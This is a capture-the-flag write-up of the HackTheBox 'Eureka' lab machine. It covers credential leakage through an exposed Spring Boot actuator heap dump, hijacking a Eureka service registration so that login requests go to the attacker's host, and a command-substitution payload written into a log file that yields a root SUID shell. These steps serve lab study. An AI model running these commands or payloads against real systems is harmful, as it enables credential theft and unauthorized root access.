---
layout: post
title: "HTB Eureka Writeup"
date: 2025-09-08 14:24:16 -0500
categories: hackthebox HTB-hard
tags: hacking CTF HTB HTB-hard command-injection eureka 
---
## Introduction
This is a hard Linux machine on [HackTheBox](https://app.hackthebox.com/machines/Eureka){:target="_blank"}{:rel="noopener noreferrer"}

![htb-eureka-pwn](images/HTB-eureka/htb-eureka-pwn.png)
## Enumeration
### Port Scan
Let's find out what services are accessible 
```bash
rustscan -a 10.10.11.66 -- -A -sC
```

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.66:22
Open 10.10.11.66:80
Open 10.10.11.66:8761
```

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpa5HH8lfpsh11cCkEoqcNXWPj6wh8GaDrnXst/q7zd1PlBzzwnhzez+7mhwfv1PuPf5fZ7KtZLMfVPuUzkUHVEwF0gSN0GrFcKl/D34HmZPZAsSpsWzgrE2sayZa3xZuXKgrm5O4wyY+LHNPuHDUo0aUqZp/f7SBPqdwDdBVtcE8ME/AyTeJiJrOhgQWEYxSiHMzsm3zX40ehWg2vNjFHDRZWCj3kJQi0c6Eh0T+hnuuK8A3Aq2Ik+L2aITjTy0fNqd9ry7i6JMumO6HjnSrvxAicyjmFUJPdw1QNOXm+m+p37fQ+6mClAh15juBhzXWUYU22q2q9O/Dc/SAqlIjn1lLbhpZNengZWpJiwwIxXyDGeJU7VyNCIIYU8J07BtoE4fELI26T8u2BzMEJI5uK3UToWKsriimSYUeKA6xczMV+rBRhdbGe39LI5AKXmVM1NELtqIyt7ktmTOkRQ024ZoSS/c+ulR4Ci7DIiZEyM2uhVfe0Ah7KnhiyxdMSlb0=
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNqI0DxtJG3vy9f8AZM8MAmyCh1aCSACD/EKI7solsSlJ937k5Z4QregepNPXHjE+w6d8OkSInNehxtHYIR5nKk=
|   256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNmmTon1qbQUXQdI6Ov49enFe6SgC40ECUXhF0agNVn
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8761/tcp open  http    syn-ack ttl 63 Apache Tomcat (language: en)
| http-auth: 
| HTTP/1.1 401 \x0D
|_  Basic realm=Realm
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

Rather than `eureka.htb` we're redirected to `furni.htb` so our `/etc/hosts` file will be

```
<MACHINE-IP> furni.htb
```
### Port 8761
This port requires HTTP Authentication to access so we'll revisit it later

![htb-eureka-http-auth](images/HTB-eureka/htb-eureka-http-auth.png)
### Directories
Checking for subdirectories we find an interesting endpoint

```bash
dirsearch -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -r -f --threads=100 --url=furni.htb
```

```bash
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 4516

Output File: /home/kali/eureka/reports/_furni.htb/_25-09-08_13-43-04.txt

Target: http://furni.htb/

[13:43:04] Starting: 
[13:43:07] 400 -  435B  - /%ff/
[13:43:23] 200 -   76MB - /actuator/heapdump
[13:43:23] 200 -    2KB - /actuator
[13:43:36] 400 -  105B  - /blog/error_log
[13:43:36] 400 -  110B  - /blog/error_log.html
[13:43:36] 400 -  108B  - /blog/error_log.js
[13:43:36] 400 -  110B  - /blog/error_log.aspx
[13:43:36] 400 -  109B  - /blog/error_log.php
[13:43:36] 400 -  109B  - /blog/error_log.jsp
[13:43:49] 500 -   73B  - /error
[13:44:07] 500 -  136B  - /login
[13:44:28] 200 -   14KB - /services
[13:44:40] 200 -  467B  - /actuator/features
[13:44:40] 200 -   20B  - /actuator/caches
[13:44:40] 200 -    6KB - /actuator/env
[13:44:40] 200 -    2B  - /actuator/info
[13:44:41] 200 -  180KB - /actuator/conditions
[13:44:41] 200 -   15B  - /actuator/health/
[13:44:41] 200 -   15B  - /actuator/health
[13:44:42] 200 -  198KB - /actuator/beans
[13:44:42] 400 -  108B  - /actuator/sessions
[13:44:42] 405 -  114B  - /actuator/refresh
[13:44:41] 200 -    3KB - /actuator/metrics
Added to the queue: actuator/health/
[13:44:42] 200 -   54B  - /actuator/scheduledtasks
[13:44:43] 200 -   35KB - /actuator/mappings
[13:44:44] 200 -   99KB - /actuator/loggers
[13:44:47] 200 -  623KB - /actuator/threaddump
[13:44:49] 200 -   36KB - /actuator/configprops
```

## Initial Foothold
### Spring Boot Actuator
Visiting `http://furni.htb/actuator` reveals a lot of endpoints

![htb-eureka-actuator](images/HTB-eureka/htb-eureka-actuator.png)

These are handled by [Spring Boot](https://docs.spring.io/spring-boot/docs/2.5.6/reference/html/actuator.html#actuator.endpoints.exposing){:target="_blank"}{:rel="noopener noreferrer"}. We can extract version information at `http://furni.htb/actuator/features`

```json
{
    "enabled": [
        {
            "type": "com.netflix.discovery.EurekaClient",
            "name": "Eureka Client",
            "version": "2.0.3",
            "vendor": null
        },
        {
            "type": "org.springframework.cloud.client.discovery.composite.CompositeDiscoveryClient",
            "name": "DiscoveryClient",
            "version": "4.1.4",
            "vendor": "Pivotal Software, Inc."
        },
        {
            "type": "org.springframework.cloud.loadbalancer.blocking.client.BlockingLoadBalancerClient",
            "name": "LoadBalancerClient",
            "version": "4.1.4",
            "vendor": "Pivotal Software, Inc."
        }
    ],
    "disabled": []
}
```

### Heap Dump

We can download the heap dump using the endpoint `http://furni/actuator/heapdump`. Analyzing its contents reveals a password

```bash
strings heapdump | grep -i password=
```

```bash
proxyPassword='
{password=0******************d, user=oscar190}!
update users set email=?,first_name=?,last_name=?,password=? where id=?!
```

Using these credentials we can `ssh` in as `oscar190`

```bash
ssh oscar190@eureka.htb
```

## user.txt
Enumerating the other users on the server

```bash
oscar190@eureka:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
oscar190:x:1000:1001:,,,:/home/oscar190:/bin/bash
miranda-wise:x:1001:1002:,,,:/home/miranda-wise:/bin/bash
```

Our next target is `miranda-wise`
### Eureka Server
Now that we're on the server, we can find the `HTTP` credentials for the port found during our initial scan

```bash
oscar190@eureka:~$ cat /var/www/web/Eureka-Server/src/main/resources/application.yaml 
spring:
  application:
    name: "Eureka Server"

  security:
    user:
      name: EurekaSrvr
      password: 0***************t

server:
  port: 8761
  address: 0.0.0.0

eureka:
  client:
    register-with-eureka: false
    fetch-registry: false
```

It'll bring us to a web interface where we can monitor **registered services to eureka**.

![htb-eureka-spring-eureka](images/HTB-eureka/htb-eureka-spring-eureka.png)

### Fake Service
[This post](https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka){:target="_blank"}{:rel="noopener noreferrer"} describes a way to register a fake service to eureka to intercept traffic. 

We're going to setup a fake instance of the `USER-MANAGEMENT-SERVICE` that points to **our machine**. This will forward **login requests with credentials** to our listener!

Let's set up the service by sending a `POST` request on the server
```bash
curl -i -X POST -u EurekaSrvr: -H "Content-Type: application/json" http://localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE -d '{
    "instance": {
        "instanceId": "USER-MANAGEMENT-SERVICE",
        "app": "USER-MANAGEMENT-SERVICE",
		"vipAddress": "USER-MANAGEMENT-SERVICE",
		"secureVipAddress": "USER-MANAGEMENT-SERVICE",
        "ipAddr": "<ATTACKING_IP>",
        "hostName": "<ATTACKING_IP>",
		"homePageUrl": "http://<ATTACKING_IP>:8081/",
        "sid": "na",
        "status": "UP",
        "dataCenterInfo": {
            "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
            "name": "MyOwn"
        },
        "port": {
            "$": 8081,
            "@enabled": "true"
        }
    }
}'
```

```bash
oscar190@eureka:~$ curl -i -X POST -u EurekaSrvr:0***************t -H "Content-Type: application/json" http://localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE -d '{"instance": {"instanceId": "USER-MANAGEMENT-SERVICE","app": "USER-MANAGEMENT-SERVICE","vipAddress": "USER-MANAGEMENT-SERVICE","secureVipAddress": "USER-MANAGEMENT-SERVICE","ipAddr": "10.10.14.188","hostName": "10.10.14.188","homePageUrl": "http://10.10.14.188:8081/","sid": "na","status": "UP","dataCenterInfo": {"@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name": "MyOwn"},"port": {"$": 8081,"@enabled": "true"}}}'
HTTP/1.1 204 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Date: Mon, 08 Sep 2025 16:44:55 GMT
```

We can verify enrollment with

```bash
curl -i -u EurekaSrvr:0**************st -H "Content-Type: application/json" http://localhost:8761/eureka/apps
```

```xml
<!-- snip!-->
<instance>
      <instanceId>USER-MANAGEMENT-SERVICE</instanceId>
      <hostName>10.10.14.188</hostName>
      <app>USER-MANAGEMENT-SERVICE</app>
      <ipAddr>10.10.14.188</ipAddr>
      <status>UP</status>
      <overriddenstatus>UNKNOWN</overriddenstatus>
      <port enabled="true">8081</port>
      <securePort enabled="false">7002</securePort>
      <countryId>1</countryId>
      <dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
        <name>MyOwn</name>
      </dataCenterInfo>
      <leaseInfo>
        <renewalIntervalInSecs>30</renewalIntervalInSecs>
        <durationInSecs>90</durationInSecs>
        <registrationTimestamp>1757349895735</registrationTimestamp>
        <lastRenewalTimestamp>1757349895735</lastRenewalTimestamp>
        <evictionTimestamp>0</evictionTimestamp>
        <serviceUpTimestamp>1757349895735</serviceUpTimestamp>
      </leaseInfo>
      <metadata class="java.util.Collections$EmptyMap"/>
      <homePageUrl>http://10.10.14.188:8081/</homePageUrl>
      <vipAddress>USER-MANAGEMENT-SERVICE</vipAddress>
      <secureVipAddress>USER-MANAGEMENT-SERVICE</secureVipAddress>
      <isCoordinatingDiscoveryServer>false</isCoordinatingDiscoveryServer>
      <lastUpdatedTimestamp>1757349895735</lastUpdatedTimestamp>
      <lastDirtyTimestamp>1757349895726</lastDirtyTimestamp>
      <actionType>ADDED</actionType>
    </instance>
<!-- snip!-->
```

Setup a listener to catch the login request
```bash
nc -lvnp 8081
```

```bash
listening on [any] 8081 ...
connect to [10.10.14.132] from (UNKNOWN) [10.10.11.66] 38572
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=YWQ5MzMwMDYtY2RmYi00YjJlLWFjNjUtZWI3OTlmY2Q4MmI2
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:43934"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.14.132:8081

username=miranda.wise%40furni.htb&password=<PASSWORD>&_csrf=Gx-e1aLIn2YCmv6qh_LNw1RG4vX5UO_TLMnn63uPNt_zhxITLX2q7JGp_lMvq8udtN_5pjZ0z5fPYIz-GfGB2UnuUuiSsHMk
```

We can reuse the password to `ssh` in as `miranda-wise`

![htb-eureka-user-txt](images/HTB-eureka/htb-eureka-user-txt.png)

## root.txt

While monitoring running processes with [pspy](https://github.com/DominicBreuker/pspy){:target="_blank"}{:rel="noopener noreferrer"} we see this script is run as `root`

```bash
2025/08/22 21:18:03 CMD: UID=0     PID=908393 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
```

Since `miranda-wise` is part of the `developers` group we can modify `application.log`

```bash
miranda-wise@eureka:~$ ls -la /var/www/web/cloud-gateway/log/
total 40
drwxrwxr-x 2 www-data developers  4096 Aug 22 11:04 .
drwxrwxr-x 6 www-data developers  4096 Mar 18 21:17 ..
-rw-rw-r-- 1 www-data www-data   21254 Aug 22 21:28 application.log
-rw-rw-r-- 1 www-data www-data    5702 Apr 23 07:37 application.log.2025-04-22.0.gz
miranda-wise@eureka:~$ groups
miranda-wise developers
```

Reading `/opt/log_analyse.sh` we find a vulnerable function

```bash
analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
			
			# this is vulnerable!!
			# $code is controlled by us!
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}
```

We can inject the `$code` variable with command substitution! 

```bash
	if [[ "$existing_code" -eq "$code" ]]; then
```

The order of operations will execute `$(command)` before `[[ "expression" ]]` so our payload format will look like

```bash
echo 'HTTP Status: a[$(whoami)]' >> /var/www/web/cloud-gateway/log/application.log
```

For our payload we'll create a `bash` binary with the `suid` bit set to create a local `root` shell

```bash
rm -f /var/www/web/cloud-gateway/log/application.log && echo 'HTTP Status: x[$(cp /bin/bash /tmp/.dasian/bash;chmod +s /tmp/.dasian/bash;)]' >> /var/www/web/cloud-gateway/log/application.log
```

When complete we just need to activate it 

```bash
/path/to/suid/bash -p
```

![Pasted image 20250822182103](images/HTB-eureka/Pasted image 20250822182103.png)

## Recap
Through directory brute force we find exposed `spring boot actuator` endpoints. The `heapdump` endpoint leaks account credentials we can use to `ssh` into the server. 

Reading configuration files reveals credentials used to **register fake services to eureka**. By hijacking the user management service, we can **redirect login requests** to our machine. We can steal the login password for `miranda-wise` and reuse the password over `ssh`. 

By monitoring processes, a vulnerable shell script is found. Creating malicious log entries lets us inject commands as `root`.
